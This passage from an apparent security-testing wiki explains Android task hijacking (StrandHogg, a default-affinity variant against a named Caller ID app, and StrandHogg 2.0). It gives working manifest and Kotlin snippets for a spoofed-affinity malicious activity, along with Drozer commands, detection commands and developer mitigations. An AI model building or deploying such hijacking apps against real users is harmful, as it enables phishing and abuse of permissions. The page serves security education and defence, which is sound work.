  \ Activities\n\nIn Android, a **task** is essentially a set of activities that users interact with to complete a specific\
  \ job, organized within a **back stack**. This stack orders activities based on when they were opened, with the most recent\
  \ activity displayed at the top as the **foreground activity**. At any moment, only this activity is visible on the screen,\
  \ making it part of the **foreground task**.\n\nHere's a quick breakdown of activity transitions:\n\n- **Activity 1** starts\
  \ as the sole activity in the foreground.\n- Launching **Activity 2** pushes **Activity 1** to the back stack, bringing\
  \ **Activity 2** to the foreground.\n- Starting **Activity 3** moves **Activity 1** and **Activity 2** further back in the\
  \ stack, with **Activity 3** now in front.\n- Closing **Activity 3** brings **Activity 2** back to the foreground, showcasing\
  \ Android's streamlined task navigation mechanism.\n\n![https://developer.android.com/images/fundamentals/diagram_backstack.png](<../../images/image\
  \ (698).png>)\n\n---\n\n## Task affinity attacks\n\n`taskAffinity` tells Android which task an `Activity` would *prefer*\
  \ to belong to.  When two activities share the same affinity **Android is allowed to merge them inside the same back-stack\
  \ even if they come from different APKs**.\n\nIf an attacker can place a malicious activity at the **root** of that stack,\
  \ every time the victim opens the legitimate application the malicious UI will be the first thing the user sees – perfect\
  \ for phishing or abusive permission requests.\n\nThe attack surface is wider than many developers think because **every\
  \ activity automatically inherits an affinity equal to the application package name** (unless the developer sets `android:taskAffinity=\"\
  \"`).  Therefore *doing nothing* already leaves the app open to task hijacking on Android versions prior to 11.\n\n### Classic\
  \ \"singleTask / StrandHogg\" scenario\n\n1. The attacker declares an activity with:\n   ```xml\n   <activity android:name=\"\
  .EvilActivity\"\n             android:exported=\"true\"\n             android:taskAffinity=\"com.victim.package\"\n    \
  \         android:launchMode=\"singleTask\" >\n       <intent-filter>\n           <action android:name=\"android.intent.action.MAIN\"\
  />\n           <category android:name=\"android.intent.category.LAUNCHER\"/>\n       </intent-filter>\n   </activity>\n\
  \   ```\n2. The malicious app is started once so that the task (with the spoofed affinity) exists in recent tasks.\n3. When\
  \ the user later opens the real application, Android finds there is already a task whose **root affinity matches the package**\
  \ and just brings that task to the foreground.\n4. The attacker’s UI is shown first.\n\n### Default–Affinity (no `singleTask`)\
  \ variant  – Caller ID case study\n\nThe vulnerability reported in the **Caller ID (caller.id.phone.number.block)** application\
  \ shows that the attack *also* works against the default `standard` launch mode:\n\n1. Attacker application creates a fake\
  \ root activity and immediately hides itself:\n   ```kotlin\n   class HackActivity : AppCompatActivity() {\n       override\
  \ fun onCreate(savedInstanceState: Bundle?) {\n           super.onCreate(savedInstanceState)\n           moveTaskToBack(true)\
  \   // keep the task in recents but out of sight\n       }\n   }\n   ```\n2. The manifest only needs to copy the victim\
  \ package into `taskAffinity`:\n   ```xml\n   <activity android:name=\".HackActivity\"\n             android:exported=\"\
  true\"\n             android:taskAffinity=\"com.caller.id.phone.number.block\" >\n       <intent-filter>\n           <action\
  \ android:name=\"android.intent.action.MAIN\"/>\n           <category android:name=\"android.intent.category.LAUNCHER\"\
  />\n       </intent-filter>\n   </activity>\n   ```\n3. As soon as the user installs and opens the malicious app **once**,\
  \ a task whose affinity equals the victim package exists (but sits in the background).\n4. When the real Caller ID application\
  \ is launched, Android re-uses that task and brings `HackActivity` to the foreground → phishing window/permission abuse.\n\
  \n> NOTE: Starting with **Android 11 (API 30)** the system does *not* place two packages that are not part of the same UID\
  \ into the same task by default, mitigating this particular variant.  Older versions remain vulnerable.\n\n---\n\n### StrandHogg\
  \ 2.0 (CVE-2020-0096) – Reflection-based task hijack\n\nGoogle’s May-2020 security bulletin fixed a more advanced variant\
  \ dubbed **StrandHogg 2.0**.  The exploit **does not rely on `taskAffinity` at all**; instead it uses *reflection* to dynamically\
  \ insert the attacker’s activity at the top of *every* running task, completely bypassing the “shared-UID” restriction introduced\
  \ by Android 11.\n\nKey points:\n\n* A zero-permission malicious app can, once opened, iterate over running tasks and call\
  \ hidden APIs to **re-parent** its own activity into any task.\n* Because the activity is inserted after run-time, neither\
  \ `launchMode` nor static manifest analysis can detect the attack in advance.\n* Patched by back-porting a check into **Android\
  \ 8.0/8.1/9** (May 2020 SPL).  **Android 10 and later are not affected.**\n\nDetection on pre-patched devices can be performed\
  \ with `adb shell dumpsys activity activities` and watching for suspicious activities whose package name differs from the\
  \ task’s *affinity*.\n\nMitigation for legacy devices is the same as classic Task Hijacking **plus** run-time verification\
  \ (e.g. calling [`ActivityManager#getRunningTasks`](https://developer.android.com/reference/android/app/ActivityManager#getRunningTasks(int))\
  \ and validating your own package name).\n\n---\n\n## Detection & Exploitation checklist\n\n1. **Static review** – Pull\
  \ `AndroidManifest.xml` from the target APK and check that each `<activity>` (or the global `<application>` element) contains\
  \ `android:taskAffinity=\"\"` (empty) **or** a customised value.  Tools such as:\n   ```bash\n   # Using apkanalyzer (Android\
  \ SDK)\n   apkanalyzer manifest print app.apk | grep -i taskaffinity\n\n   # Using AXMLPrinter2\n   java -jar AXMLPrinter2.jar\
  \ AndroidManifest.xml | grep taskAffinity\n   ```\n2. **Dynamic review** – On the device open the target app and list tasks:\n\
  \   ```bash\n   adb shell dumpsys activity activities | grep -A3 \"TASK\" | grep -E \"Root|affinity\"\n   ```\n   A task\
  \ whose root affinity equals the victim package but whose top activity belongs to a *different* package is a red flag.\n\
  3. Craft a malicious app as described above, or use **[Drozer](https://github.com/WithSecureLabs/drozer)**:\n   ```bash\n\
  \   drozer console connect\n   run app.activity.start --component com.victim/.MainActivity --action android.intent.action.MAIN\n\
  \   run app.activity.info com.victim\n   ```\n\n---\n\n## Mitigation\n\nDevelopers should:\n\n* Explicitly set `android:taskAffinity=\"\
  \"` at the `<application>` level (recommended) **or** give each activity a unique, private affinity.\n* For highly sensitive\
  \ screens, combine the above with `android:launchMode=\"singleInstance\"` or modern [`setLaunchMode`](https://developer.android.com/reference/android/content/pm/ActivityInfo#launchMode)\
  \ protections.\n* Upgrade the app’s `targetSdkVersion` and enforce **Android 11** behavioural changes where tasks are not\
  \ shared across packages by default.\n* Target **Android 12 (API 31) or higher** so that the mandatory `android:exported`\
  \ attribute forces developers to audit every externally-reachable component.\n* Consider run-time self-defence: periodically\
  \ query `ActivityTaskManager` to ensure that your top activity’s package matches your own.\n\n---\n\n## Related UI-Hijacking\
  \ techniques\n\nTask hijacking is often combined with or replaced by **tapjacking** (overlay-based UI deception).  The 2025\
  \ **TapTrap** research showed that fully transparent *animation-driven* activities can bypass the overlay-touch restrictions\
  \ introduced in Android 12–14 and still trick users into granting dangerous permissions.  While TapTrap is not strictly\
  \ *task* hijacking, the end-goal (phishing clicks) is identical – so modern assessments should check for both attack surfaces.\n\
